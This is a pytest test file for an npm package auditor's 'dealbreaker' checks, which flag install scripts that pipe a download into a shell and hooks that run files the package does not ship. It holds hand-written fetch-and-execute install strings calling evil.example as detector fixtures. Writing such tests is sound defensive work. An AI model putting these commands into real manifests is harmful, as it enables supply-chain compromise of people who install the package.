# CLASS MAP — the dealbreaker path: the two structural checks (inventory) and the
# hardcoded-DANGEROUS short-circuit they trigger (pipeline). Nothing in the suite
# covered either before this file, on the ONE path where DANGEROUS is asserted
# with no hypothesis, no experiment and no judge (AUDIT_CORE_EXPLAINED §7.3, §9).
# Units: analyze_inventory(package_dir) -> InventoryReport.{dealbreaker,flags} and
#        AuditPipeline.run(...) -> the AuditReport a consumer receives, the frames
#        it saw, and the exception it may get instead.
# Blackbox: a package on disk in; a report / an exception / the durable event log
# out. No private imports, no call-sequence assertions.
# (seams: pipeline.resolve_package -> a package prepared in a private tmp workdir,
#  exactly as the real one hands it over; the LLM provider is ScriptedLlm({}) —
#  NO script for ANY role — so the first LLM call of any later phase is an
#  AssertionError: that is how "no phase after inventory ran" is observed from
#  outside the pipeline. C19 swaps in a scripted provider for the contrast. No
#  docker: every manifest here declares no `dependencies`, so
#  provision_dependencies short-circuits before it reaches the daemon.
#  report_store.DATA_DIR is resolved at import, so C18 re-points that module
#  constant, the same knob conftest documents.)
#
# INPUT PROVENANCE (TESTING.md, "parsers of external formats"): a package.json is
# external — its bytes come from a publisher. The NEGATIVE direction therefore
# runs REAL captured manifests: C5b extracts the committed npm tarballs
# (tests/fixtures/registry/{chalk-5.6.2,is-number-7.0.0}.tgz) and audits the real
# tree, real file modes and real script values included. The POSITIVE direction
# cannot be captured: the producer of a `curl … | sh` install hook is malware, and
# the only such corpus here is sandbox/test-fixtures/test-pkg-bench-dd-*, which is
# live malware banned from committed files. Those script strings are therefore
# hand-authored adversary text and marked as such here — the mitigation is that
# every one of them is paired with a near-miss (C5a) and with the real manifests
# (C5b), so a regex that matched nothing, or matched everything, fails this file.
# Manifests are built from dicts through json.dumps rather than written as
# literals; only C15 needs raw bytes, because its subject IS a broken file.
# The classes added for the install-hook rework (C20-C27) close the gap between
# those two directions: PUBLISHED_HOOKS holds install-script values copied verbatim
# out of published manifests, each naming the package it came from, because every
# one of them is a BENIGN shape the recogniser used to get wrong. Their provenance
# is an installed tree — the bytes npm ships — surveyed over 1334 unique
# (name, version) manifests; a tarball per one-line `scripts` value would be out of
# proportion, so the package@version is named and the survey is reproducible
# against any installed tree.
#
# Axes: which check trips × the scripts block's shape × manifest health × what the
#       consumer receives (verdict, report shape, frames, persistability)
#
# DEALBREAKER 1 — shell-pipe
#   C1  a piped install script trips it: check="shell-pipe", detail names the
#       script KEY and the offending value
#   C2  each of the six patterns, plus case-insensitivity: curl|sh, curl|bash,
#       wget|sh, wget|bash, curl piped into ANYTHING (the broadest), and
#       wget -O … && (sh|chmod)
#   C3  every script key is scanned, not just the lifecycle hooks — a `build`
#       script `npm install` would never run still produces DANGEROUS
#   C4  the early return SUPPRESSES every advisory flag: the same package (ELF
#       binary + non-standard dotfile + lifecycle hook) reports 3 flags with a
#       benign script and flags == [] with the pipe. Paired, so the empty list
#       cannot be vacuous
#   C5  the false-positive direction, which matters more here than usual because a
#       false dealbreaker is a DANGEROUS verdict on a clean package:
#       C5a near misses — `node setup.js`, curl with no pipe, a pipe with no
#           fetcher, wget with neither -O nor &&
#       C5b the two REAL published manifests (chalk@5.6.2, is-number@7.0.0) read
#           out of the committed tarballs: no dealbreaker, and `scripts` non-empty
#           so the scan actually iterated real values
# DEALBREAKER 2 — missing-install-script
#   C6  a lifecycle hook running a file the package does not contain trips it:
#       check="missing-install-script", detail names the reference
#   C7  the pairing that makes C6 mean something: same manifest, file present ->
#       no dealbreaker
#   C8  only INSTALL-time references are checked — a `main` pointing at a missing
#       file is not a dealbreaker (nothing executes it at install time)
#   C9  reference normalization: `node ./setup.js` resolves to `setup.js`;
#       `node lib/setup.js` needs the file AT `lib/setup.js`
#   C10 (was a pinned FINDING; now the contract) the interpreter is not the fact.
#       `sh install.sh` / `bash ./install.sh` / `python3 install.sh` /
#       `/bin/sh install.sh` / `./install.sh` (shebang, no interpreter word) with
#       the target ABSENT is the same dealbreaker as C6. Until this class flipped,
#       only a `node …` command yielded a reference at all, so every other
#       interpreter walked through with an advisory warn
#   C11 precedence: a manifest tripping both reports shell-pipe (checked first)
# THE INSTALL-TIME HOOK SET, AND THE THIRD OUTCOME (the coverage gap)
#   Why there are three outcomes and not two: an install hook whose target we
#   cannot resolve is a statement about THIS ENGINE, not about the package, so it
#   cannot carry the dealbreaker's accusation — measured over 227 published
#   packages with lifecycle hooks, unresolvable install hooks are dominated by
#   ordinary native-build tooling. It is still a coverage gap and must never reach
#   SAFE, so it is a `critical` `install-coverage-gap` flag: one closed name, so a
#   consumer refusing SAFE branches on one fact rather than on a list of gap kinds
#   that grows every time a new one is found.
#   C20 `prepare` / `prepublish` are BUILD-time, not install-time: npm never runs
#       them for a registry tarball installed as a dependency, which is the only
#       artifact resolve.py fetches. They name no install entry point and cannot
#       be a dealbreaker — 11 of the 14 published packages the old check called
#       DANGEROUS were this shape. Still reported via `lifecycle-scripts`
#   C21 an unresolvable install hook (inline `-e` code; three native-build front
#       ends) → no dealbreaker, one `critical` `install-coverage-gap` quoting hook
#       and command. C21b is the pairing: a fully resolved hook leaves none
#   C22 the legitimate non-node case that must not be condemned: `sh
#       ./scripts/postinstall.sh` WITH the file shipped is clean and its reference
#       is recorded — and the residue is stated, because FLAG reads js/ts only, so
#       a shipped `.sh` is resolved but never analysed. Paired with a `.js` target
#   C23 targets resolve the way the LOADER resolves them: `node scripts/postinstall`
#       is `scripts/postinstall.js`, `node lib` is `lib/index.js` — node's rule,
#       not a general one, so `sh scripts/postinstall` still misses
#   C24 each command of a compound hook is classified separately (`node build.js;
#       tsc …` → build.js resolved, tsc a gap). The old reference was `build.js;`
#   C25 a fetch-then-execute shape SHELL_PIPE_PATTERNS misses (`curl -o f url && sh
#       f`) lands anyway — as C6's fact, not as a seventh pattern
#   C26 `entryPoints.install` order follows npm's run order, not str hash order
#   C27 degenerate values (unbalanced quote, `$VAR` path, no operand, a bare
#       operator, whitespace, a bare name that is a PATH lookup, a path into a
#       SKIP_DIRS dir we never inventoried) → a gap, never a crash, never clean
# THE SCRIPTS BLOCK — boundaries
#   C12 `"scripts": {}` -> no dealbreaker, no lifecycle flag
#   C13 no `scripts` key at all -> same, and entryPoints.install == []
#   C14 non-string script values (list / null / number) are dropped, so they can
#       neither trip a check nor raise
# MANIFEST HEALTH × THE CHECKS — the silent gap 95cfb38 closed
#   C15 a manifest whose TEXT declares a piped install script but which does not
#       parse -> AuditIncompleteError(inventory, NPMGUARD-0031, retryable) and NO
#       report. Before 95cfb38 the parse failure became `{}`: empty scripts and an
#       empty install list made BOTH checks pass trivially, so the audit continued
#       with zero manifest knowledge — and the only direction that swallow could
#       bias was toward SAFE
# THE SHORT-CIRCUIT — what actually ships
#   C16 the report a consumer receives, for BOTH checks: verdict DANGEROUS,
#       rationale "Dealbreaker: <check> — <detail>", all six counts 0, hypotheses
#       [], confirmedHypIds [], fileSummaries [], dealbreaker present,
#       schemaVersion 2, trace exactly [resolve, inventory]. Zero hypotheses is
#       the CONTRACT here (§9), so the assertion is the whole shape, not the
#       verdict string
#   C17 the frames: audit_started, the resolve and inventory phase pairs,
#       dependencies_provisioned, file_list, inventory_meta — and nothing from a
#       later phase (no intent_extracted / file_analyzing / file_verdict /
#       triage_complete / graph_built), and NO terminal frame (run() never emits
#       one; the service owns that transition)
#   C18 the hand-built report is still persistable: extract_report_version reads
#       the version out of the two-entry trace's inventory PhaseLog and save_report
#       files it under it. §9's last paragraph, and the one thing a report
#       assembled by hand could plausibly have broken
#   C19 a package that trips NEITHER check proceeds to the normal pipeline: the
#       scripted LLM is consulted, the trace grows past inventory, dealbreaker is
#       None and the verdict comes from the graph
# Adversarial pass: 2026-07-25/dealbreaker — "which dimension is missing?" ->
# the answer was provenance (no real manifest was in the file at all: C5b), the
# suppression pairing (C4's control run), and the persistability of a report no
# _report() call ever assembled (C18).
# Adversarial pass: 2026-07-25/install-hook — "what does the recogniser claim, and
# what does it actually match?" -> C10 flipped, and the same question asked of the
# rest produced C20-C27. Measuring first is what changed the answer: the check the
# hole was in was ALSO calling 14 real published packages DANGEROUS (whatwg-url,
# lru-cache@7, tr46, @lezer/*, @google/genai, whatwg-encoding, protobufjs, msw),
# so widening it interpreter-first would have multiplied a false-positive rate
# nobody had measured. Now 0 of that corpus is a dealbreaker and `sh install.sh`
# with the file absent is.
from __future__ import annotations

import json
import tarfile
from pathlib import Path
from types import SimpleNamespace

import pytest

from kit_llm import ScriptedLlm
from kit_spine import make_engine, make_session_factory
from kit_spine.db import metadata
from kit_spine.notify_polling import PollingNotifier
from kit_stream import StreamService
from npmguard import pipeline as pipeline_module
from npmguard import report_store
from npmguard.config import Settings
from npmguard.errors import AuditIncompleteError
from npmguard.events import AuditEmitter, sse_events
from npmguard.inventory import BUILD_TIME_HOOKS, INSTALL_TIME_HOOKS, analyze_inventory
from npmguard.llm_runtime import build_npmguard_llm
from npmguard.persistence import AuditSessionStore
from npmguard.pipeline import AuditPipeline
from npmguard.resolve import ResolvedPackage

PACKAGE_NAME = "dealbreaker-under-test"
PACKAGE_VERSION = "2.0.1"
BENIGN_HOOK = "node setup.js"
SETUP_SOURCE = "module.exports = 1;\n"
ELF_MAGIC = b"\x7fELF\x02\x01\x01\x00payload"
REGISTRY_FIXTURES = Path(__file__).parent / "fixtures" / "registry"
# Hand-authored adversary text (see INPUT PROVENANCE above): one literal per
# SHELL_PIPE_PATTERNS alternative, plus one upper-cased to exercise re.I.
PIPED_SCRIPTS = {
    "curl-into-sh": "curl https://evil.example/i.sh | sh",
    "curl-into-bash": "curl https://evil.example/i.sh | bash",
    "wget-into-sh": "wget https://evil.example/i.sh | sh",
    "wget-into-bash": "wget https://evil.example/i.sh | bash",
    "curl-into-anything": "curl https://evil.example/i.js | node -",
    "wget-file-then-sh": "wget -O /tmp/i.sh https://evil.example/i.sh && sh /tmp/i.sh",
    "wget-file-then-chmod": "wget -O /tmp/i https://evil.example/i && chmod +x /tmp/i",
    "upper-cased": "CURL HTTPS://EVIL.EXAMPLE/I.SH | SH",
}
# Install-hook commands copied VERBATIM out of published manifests, each with the
# package it came from. These are not adversary text and not invented: every one is
# a benign, widely-installed package, and every one is here because the recogniser
# used to get it wrong (C20-C24). Provenance is the installed tree — the bytes npm
# actually ships — surveyed over 1334 unique (name, version) manifests, 227 of them
# declaring a lifecycle hook. Committing those tarballs is out of proportion for a
# one-line `scripts` value, so the package@version is named instead and the survey
# is reproducible against any installed tree.
PUBLISHED_HOOKS = {
    # protobufjs@7.5.4 / @8.0.0 — ships scripts/postinstall.js; node resolves it.
    "extensionless-node-target": "node scripts/postinstall",
    # msw@2.15.0 — inline code, which the old extractor read as a FILENAME.
    "inline-node-code": "node -e \"import('./config/scripts/postinstall.js').catch(() => void 0)\"",
    # node-pty@1.1.0 (the `||` branch of its install hook).
    "native-rebuild": "node-gyp rebuild",
    # keytar@7.9.0.
    "prebuilt-binary": "prebuild-install || node-gyp rebuild",
    # tree-sitter-bash@0.25.1.
    "gyp-build": "node-gyp-build",
    # @lezer/lr@1.4.9 — the old reference was the literal `build.js;`.
    "compound-node-then-tsc": "node build.js; tsc src/constants.ts -d --outDir dist",
    # whatwg-url@14.2.0's `prepare`: runs a script its own `files` keeps out of the
    # tarball, which is legal because `prepare` never runs for a tarball dependency.
    "dev-only-prepare": "node scripts/transform.js",
}
NEAR_MISSES = {
    "node-hook": BENIGN_HOOK,
    "curl-without-pipe": "curl -o vendor.tgz https://registry.example/vendor.tgz",
    "pipe-without-fetcher": "cat notes.txt | sh",
    "wget-without-o-or-and": "wget https://registry.example/vendor.tgz",
}


def _manifest(**overrides) -> str:
    package = {"name": PACKAGE_NAME, "version": PACKAGE_VERSION, "main": "index.js"}
    package.update(overrides)
    return json.dumps(package)


def _write(root: Path, files: dict[str, str | bytes]) -> Path:
    package = root / "package"
    package.mkdir(parents=True)
    for name, content in files.items():
        target = package / name
        target.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            target.write_bytes(content)
        else:
            target.write_text(content, encoding="utf-8")
    return package


def _hook_package(script: str, hook: str = "preinstall", **files: str) -> dict[str, str]:
    return {
        "package.json": _manifest(scripts={hook: script}),
        "index.js": SETUP_SOURCE,
        "setup.js": SETUP_SOURCE,
        **files,
    }


def _extract_registry_tarball(tarball: Path, destination: Path) -> Path:
    with tarfile.open(tarball) as archive:
        archive.extractall(destination, filter="data")
    return destination / "package"


def _frame_types(frames: list[dict]) -> list[str]:
    return [frame["type"] for frame in frames]


@pytest.fixture
async def audit(tmp_path, monkeypatch):
    """Run AuditPipeline.run over a package materialized on disk, and hand back
    the report, the durable frames a consumer would have seen, and the ids."""
    opened: list[tuple[object, object]] = []
    runs = 0

    async def _run(files: dict[str, str | bytes], *, provider=None) -> SimpleNamespace:
        nonlocal runs
        runs += 1
        monkeypatch.setenv("NPMGUARD_AUDIT_LOG_DIR", str(tmp_path / f"logs{runs}"))
        engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / f'state{runs}.sqlite3'}")
        async with engine.begin() as connection:
            await connection.run_sync(metadata.create_all)
        factory = make_session_factory(engine)
        settings = Settings(_env_file=None)
        # No script for any role: a later phase's first LLM call fails loudly.
        llm = build_npmguard_llm(factory, settings, provider=provider or ScriptedLlm({}))
        opened.append((engine, llm))
        sessions = AuditSessionStore(factory)
        stream = StreamService(factory, PollingNotifier())
        workdir = tmp_path / f"work{runs}"
        package = _write(workdir, files)

        async def _resolve(package_name: str, version: str | None = None) -> ResolvedPackage:
            return ResolvedPackage(path=package, workdir=workdir)

        monkeypatch.setattr(pipeline_module, "resolve_package", _resolve)
        session = await sessions.create(PACKAGE_NAME, PACKAGE_VERSION)
        pipeline = AuditPipeline(settings, llm, sessions)
        emitter = AuditEmitter(session.audit_id, stream)
        try:
            result = await pipeline.run(
                PACKAGE_NAME, audit_id=session.audit_id, version=PACKAGE_VERSION, emitter=emitter
            )
        finally:
            # Drained even when run() raises, and parked on the fixture function so
            # a test asserting on an EXCEPTION can still inspect what the viewer saw
            # (there is no result object to hang it off in that case).
            self_frames = []
            async for frame in sse_events(session.audit_id, stream, follow=False):
                line = next(part for part in frame.splitlines() if part.startswith("data: "))
                self_frames.append(json.loads(line.removeprefix("data: ")))
            _run.frames = self_frames
        return SimpleNamespace(
            report=result.report,
            frames=self_frames,
            audit_id=session.audit_id,
            package=package,
        )

    _run.frames = []
    yield _run
    for engine, llm in opened:
        await llm.aclose()
        await engine.dispose()


# --------------------------------------------------------------------------- #
# DEALBREAKER 1 — shell-pipe
# --------------------------------------------------------------------------- #


async def test_piped_install_script_is_a_dealbreaker(tmp_path) -> None:
    """C1: the check names itself and quotes the script that tripped it."""
    package = _write(tmp_path, _hook_package(PIPED_SCRIPTS["curl-into-sh"]))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "shell-pipe"
    assert "'preinstall'" in inventory.dealbreaker.detail
    assert PIPED_SCRIPTS["curl-into-sh"] in inventory.dealbreaker.detail


@pytest.mark.parametrize("name", sorted(PIPED_SCRIPTS))
async def test_every_shell_pipe_pattern_trips(tmp_path, name: str) -> None:
    """C2: one case per SHELL_PIPE_PATTERNS alternative, plus an upper-cased one
    for re.I. A pattern that matched nothing would show up here as one green
    parametrization turning red, not as a silently unreachable branch."""
    package = _write(tmp_path, _hook_package(PIPED_SCRIPTS[name]))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None, PIPED_SCRIPTS[name]
    assert inventory.dealbreaker.check == "shell-pipe"


async def test_shell_pipe_is_matched_in_a_non_lifecycle_script(tmp_path) -> None:
    """C3: the scan covers EVERY script key. `npm install` never runs `build`, so
    this is a DANGEROUS verdict for a script no installer would execute — the
    check's declared breadth, pinned where a narrowing would be visible."""
    package = _write(tmp_path, _hook_package(PIPED_SCRIPTS["curl-into-sh"], hook="build"))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "shell-pipe"
    assert "'build'" in inventory.dealbreaker.detail


async def test_dealbreaker_suppresses_every_advisory_flag(tmp_path) -> None:
    """C4: the early return returns ([], dealbreaker). Paired with the identical
    package under a benign hook, which DOES produce the three flags — otherwise
    `flags == []` would prove nothing about suppression."""
    files = {
        "package.json": _manifest(scripts={"preinstall": BENIGN_HOOK}),
        "setup.js": SETUP_SOURCE,
        ".secret-token": "abc\n",
        "payload.bin": ELF_MAGIC,
    }
    control = await analyze_inventory(_write(tmp_path / "control", files))
    assert control.dealbreaker is None
    assert {flag.check for flag in control.flags} == {
        "lifecycle-scripts",
        "binary-detected",
        "hidden-dotfile",
    }

    tripped = dict(files)
    tripped["package.json"] = _manifest(scripts={"preinstall": PIPED_SCRIPTS["curl-into-sh"]})
    inventory = await analyze_inventory(_write(tmp_path / "tripped", tripped))
    assert inventory.dealbreaker is not None
    assert inventory.flags == []


@pytest.mark.parametrize("name", sorted(NEAR_MISSES))
async def test_near_misses_do_not_trip_the_shell_pipe_check(tmp_path, name: str) -> None:
    """C5a: a false dealbreaker is a DANGEROUS verdict on a clean package, so the
    negative direction is enumerated too: no fetcher, no pipe, or neither."""
    package = _write(tmp_path, _hook_package(NEAR_MISSES[name]))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None, NEAR_MISSES[name]


@pytest.mark.parametrize(
    ("tarball", "expected_name"),
    [
        ("chalk/chalk-5.6.2.tgz", "chalk"),
        ("is-number/is-number-7.0.0.tgz", "is-number"),
    ],
)
async def test_real_published_packages_trip_nothing(tmp_path, tarball, expected_name) -> None:
    """C5b: real captured input — the manifests, trees and file modes npm actually
    published, extracted from the committed registry tarballs. `scripts` is
    asserted non-empty so the shell-pipe scan really did iterate over published
    script values; an empty dict would make the None dealbreaker vacuous."""
    package = _extract_registry_tarball(REGISTRY_FIXTURES / tarball, tmp_path)
    inventory = await analyze_inventory(package)
    assert inventory.metadata.name == expected_name
    assert inventory.scripts, "no published scripts to scan — the assertion below is vacuous"
    assert inventory.dealbreaker is None


# --------------------------------------------------------------------------- #
# DEALBREAKER 2 — missing-install-script
# --------------------------------------------------------------------------- #


async def test_install_hook_referencing_an_absent_file_is_a_dealbreaker(tmp_path) -> None:
    """C6: the manifest says `npm install` will run a file the package does not
    contain, so what executes cannot be audited at all."""
    package = _write(
        tmp_path,
        {"package.json": _manifest(scripts={"postinstall": BENIGN_HOOK}), "index.js": SETUP_SOURCE},
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "missing-install-script"
    assert "'setup.js'" in inventory.dealbreaker.detail


async def test_install_hook_referencing_a_present_file_is_clean(tmp_path) -> None:
    """C7: the pairing — the same hook with the file shipped is not a dealbreaker,
    so C6 pins the missing file rather than the hook."""
    package = _write(tmp_path, _hook_package(BENIGN_HOOK, hook="postinstall"))
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None
    assert inventory.entryPoints.install == ["setup.js"]


async def test_missing_runtime_entry_point_is_not_a_dealbreaker(tmp_path) -> None:
    """C8: only install-time references are checked. A `main` that points nowhere
    breaks `require`, but nothing executes it during `npm install`."""
    package = _write(
        tmp_path,
        {"package.json": _manifest(main="dist/absent.js"), "index.js": SETUP_SOURCE},
    )
    inventory = await analyze_inventory(package)
    assert inventory.entryPoints.runtime == ["dist/absent.js"]
    assert inventory.dealbreaker is None


async def test_install_reference_paths_are_normalized(tmp_path) -> None:
    """C9: `./setup.js` is the file `setup.js` (Path normalization), while a
    subdirectory reference must match the shipped path exactly."""
    dotted = await analyze_inventory(_write(tmp_path / "dotted", _hook_package("node ./setup.js")))
    assert dotted.entryPoints.install == ["setup.js"]
    assert dotted.dealbreaker is None

    nested = await analyze_inventory(
        _write(
            tmp_path / "nested",
            {
                "package.json": _manifest(scripts={"preinstall": "node lib/setup.js"}),
                "lib/setup.js": SETUP_SOURCE,
            },
        )
    )
    assert nested.entryPoints.install == ["lib/setup.js"]
    assert nested.dealbreaker is None

    misplaced = await analyze_inventory(
        _write(tmp_path / "misplaced", _hook_package("node lib/setup.js"))
    )
    assert misplaced.dealbreaker is not None
    assert misplaced.dealbreaker.check == "missing-install-script"


@pytest.mark.parametrize(
    "command",
    [
        "sh install.sh",
        "bash ./install.sh",
        "python3 install.sh",
        "/bin/sh install.sh",
        "./install.sh",
    ],
)
async def test_non_node_install_hook_with_an_absent_target_is_a_dealbreaker(
    tmp_path, command: str
) -> None:
    """C10: the interpreter is NOT the fact the check turns on. This class used to
    pin the opposite — `extract_script_file_ref` read a reference only out of a
    `node …` command, so `"install": "sh install.sh"` with install.sh ABSENT
    produced no reference, no dealbreaker and only an advisory warn: the identical
    unanalysable install-time execution C6 exists to catch, walking through on a
    different interpreter. The contract is now the FACT and not the spelling — a
    hook that names a file the tarball does not ship is a dealbreaker whatever
    reads it, an absolute interpreter path does not evade it, and neither does
    dropping the interpreter so the shebang runs the file (`./install.sh`) — the
    same fact with the interpreter written inside the file instead of beside it."""
    package = _write(
        tmp_path,
        {"package.json": _manifest(scripts={"install": command}), "index.js": SETUP_SOURCE},
    )
    inventory = await analyze_inventory(package)
    assert inventory.entryPoints.install == ["install.sh"]
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "missing-install-script"
    assert "'install'" in inventory.dealbreaker.detail
    assert "'install.sh'" in inventory.dealbreaker.detail


async def test_shell_pipe_wins_over_missing_install_script(tmp_path) -> None:
    """C11: a manifest tripping both is reported as shell-pipe, because the pipe
    scan runs first and returns. The rationale a user reads depends on this."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={
                    "preinstall": "node absent-setup.js",
                    "postinstall": PIPED_SCRIPTS["curl-into-sh"],
                }
            ),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "shell-pipe"


# --------------------------------------------------------------------------- #
# THE INSTALL-TIME HOOK SET, AND THE COVERAGE GAP
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("hook", sorted(BUILD_TIME_HOOKS))
async def test_build_time_hooks_name_no_install_entry_point(tmp_path, hook: str) -> None:
    """C20: `prepare` and `prepublish` are not install-time. npm runs them for the
    ROOT project on a bare `npm install`, on pack/publish, for a link install and
    for a git dependency — never for a registry tarball installed as a dependency,
    which is the only artifact resolve.py fetches (npm 12,
    docs/content/using-npm/scripts.md, "Life Cycle Operation Order"). So a
    reference they carry is not install-time execution and cannot be a dealbreaker.
    This is not a softening, it is a measured false-positive fix: 11 of the 14
    published packages the old check called DANGEROUS across 1334 installed
    manifests were this exact shape — a `prepare` running a build script the
    manifest's own `files` keeps out of the tarball. The hook is still REPORTED, so
    the report does not lose the fact that it exists."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(scripts={hook: PUBLISHED_HOOKS["dev-only-prepare"]}),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.entryPoints.install == []
    assert inventory.dealbreaker is None
    assert f"lifecycle hooks: {hook}" in next(
        flag.detail for flag in inventory.flags if flag.check == "lifecycle-scripts"
    )
    assert "install-coverage-gap" not in {flag.check for flag in inventory.flags}


@pytest.mark.parametrize(
    "name", ["inline-node-code", "native-rebuild", "prebuilt-binary", "gyp-build"]
)
async def test_unresolvable_install_hook_is_a_located_coverage_gap(tmp_path, name: str) -> None:
    """C21: the third outcome, which did not exist before. These four are REAL
    published install hooks (see PUBLISHED_HOOKS) that no file in the tarball can
    account for: inline `-e` code, and three native-build front ends. They are not
    dealbreakers — condemning them would condemn every native addon on the registry
    — but they are not clean either, so each leaves a `critical`
    `install-coverage-gap` flag quoting the hook and the command. That flag is the
    one closed fact a consumer can branch on to refuse SAFE."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(scripts={"install": PUBLISHED_HOOKS[name]}),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None
    gaps = [flag for flag in inventory.flags if flag.check == "install-coverage-gap"]
    assert len(gaps) == 1, inventory.flags
    assert gaps[0].severity == "critical"
    assert "'install'" in gaps[0].detail
    assert PUBLISHED_HOOKS[name] in gaps[0].detail


async def test_a_fully_resolved_install_hook_leaves_no_coverage_gap(tmp_path) -> None:
    """C21b: the pairing that stops C21 being vacuous — an install hook whose
    target ships AND is a file type FLAG reads produces no gap flag at all. Without
    this, a bug that flagged every package would pass C21."""
    inventory = await analyze_inventory(_write(tmp_path, _hook_package(BENIGN_HOOK, hook="install")))
    assert inventory.dealbreaker is None
    assert {flag.check for flag in inventory.flags} == {"lifecycle-scripts"}


async def test_a_shipped_shell_install_target_is_not_condemned_but_is_not_coverage(
    tmp_path,
) -> None:
    """C22: the legitimate case the widened check must not break. `sh
    ./scripts/postinstall.sh` WITH the file shipped is not a dealbreaker and the
    reference is recorded — otherwise the fix would be a false-positive machine.
    But `resolved` is a narrower claim than `analysed`: FLAG reads
    SOURCE_FILE_TYPES only, so a `.sh` file reaches no model, and that residue is
    named as a coverage gap pointing AT the file rather than counted as coverage.
    Paired with the same hook over a `.js` target, which is real coverage."""
    shell = await analyze_inventory(
        _write(
            tmp_path / "shell",
            {
                "package.json": _manifest(scripts={"install": "sh ./scripts/postinstall.sh"}),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.sh": "echo installing\n",
            },
        )
    )
    assert shell.dealbreaker is None
    assert shell.entryPoints.install == ["scripts/postinstall.sh"]
    gap = next(flag for flag in shell.flags if flag.check == "install-coverage-gap")
    assert gap.file == "scripts/postinstall.sh"
    assert "shell" in gap.detail

    analysed = await analyze_inventory(
        _write(
            tmp_path / "analysed",
            {
                "package.json": _manifest(scripts={"install": "sh ./scripts/postinstall.js"}),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.js": SETUP_SOURCE,
            },
        )
    )
    assert "install-coverage-gap" not in {flag.check for flag in analysed.flags}


async def test_a_target_is_resolved_the_way_node_resolves_it(tmp_path) -> None:
    """C23: the resolver has to agree with the loader that will actually run the
    file, or it invents missing files. `node scripts/postinstall` executes
    `scripts/postinstall.js` (verified by execution: `node dir/postinstall` loads
    `postinstall.js`), and `node .` reads `main` out of the directory's
    package.json. protobufjs@7.5.4 and @8.0.0 ship the first shape and were
    DANGEROUS under the old exact-path match. Extension search is node's rule, not
    a general one — `sh scripts/postinstall` gets no such favour, since sh would
    not find it either. And only the options BEFORE the first operand decide
    whether code came inline, so a `-e` belonging to the SCRIPT does not erase the
    script."""
    extensionless = await analyze_inventory(
        _write(
            tmp_path / "extensionless",
            {
                "package.json": _manifest(
                    scripts={"postinstall": PUBLISHED_HOOKS["extensionless-node-target"]}
                ),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.js": SETUP_SOURCE,
            },
        )
    )
    assert extensionless.dealbreaker is None

    directory = await analyze_inventory(
        _write(
            tmp_path / "directory",
            {
                "package.json": _manifest(scripts={"postinstall": "node lib"}),
                "index.js": SETUP_SOURCE,
                "lib/index.js": SETUP_SOURCE,
            },
        )
    )
    assert directory.dealbreaker is None

    script_flag = await analyze_inventory(
        _write(
            tmp_path / "script-flag",
            {
                "package.json": _manifest(scripts={"install": "node build.js -e production"}),
                "index.js": SETUP_SOURCE,
                "build.js": SETUP_SOURCE,
            },
        )
    )
    assert script_flag.entryPoints.install == ["build.js"]
    assert "install-coverage-gap" not in {flag.check for flag in script_flag.flags}

    shell = await analyze_inventory(
        _write(
            tmp_path / "shell",
            {
                "package.json": _manifest(scripts={"install": "sh scripts/postinstall"}),
                "index.js": SETUP_SOURCE,
                "scripts/postinstall.js": SETUP_SOURCE,
            },
        )
    )
    assert shell.dealbreaker is not None
    assert shell.dealbreaker.check == "missing-install-script"


async def test_each_command_in_a_compound_hook_is_classified_separately(tmp_path) -> None:
    """C24: one hook can be several commands, and reading it as one word list gets
    both halves wrong. @lezer/lr@1.4.9 ships `node build.js; tsc …`, whose old
    reference was the literal `build.js;` — semicolon included, so no package could
    ever contain it. Now `build.js` resolves AND the `tsc` command is a gap, which
    is the honest reading of a hook that runs two programs."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={"postinstall": PUBLISHED_HOOKS["compound-node-then-tsc"]}
            ),
            "index.js": SETUP_SOURCE,
            "build.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None
    assert inventory.entryPoints.install == ["build.js"]
    gaps = [flag for flag in inventory.flags if flag.check == "install-coverage-gap"]
    assert len(gaps) == 1
    assert "'tsc'" in gaps[0].detail


async def test_a_fetch_then_execute_hook_the_pipe_patterns_miss_still_lands(tmp_path) -> None:
    """C25: SHELL_PIPE_PATTERNS only spells out the `wget -O … && …` half of
    fetch-then-execute; the curl spelling has no `|` and matches none of the six
    (C2 covers what does match). It lands anyway, and not because a seventh pattern
    was added: the second command hands `sh` a path the tarball does not contain,
    which is the same fact as C6/C10. That is the point of resolving targets rather
    than recognising attack strings — the shapes an alternation misses come out as
    a dealbreaker or a gap, never as clean.

    Hand-authored adversary text, as INPUT PROVENANCE explains for every offensive
    literal in this file: the only real producers are in the banned corpus."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={"install": "curl -o /tmp/i.sh https://evil.example/i.sh && sh /tmp/i.sh"}
            ),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is not None
    assert inventory.dealbreaker.check == "missing-install-script"
    assert "/tmp/i.sh" in inventory.dealbreaker.detail


async def test_install_references_are_ordered_by_hook_not_by_hash(tmp_path) -> None:
    """C26: `entryPoints.install` is derived by iterating the install-time hooks, so
    its order used to be frozenset iteration order over strings — which varies per
    PROCESS under hash randomization (measured: five seeds, five different orders).
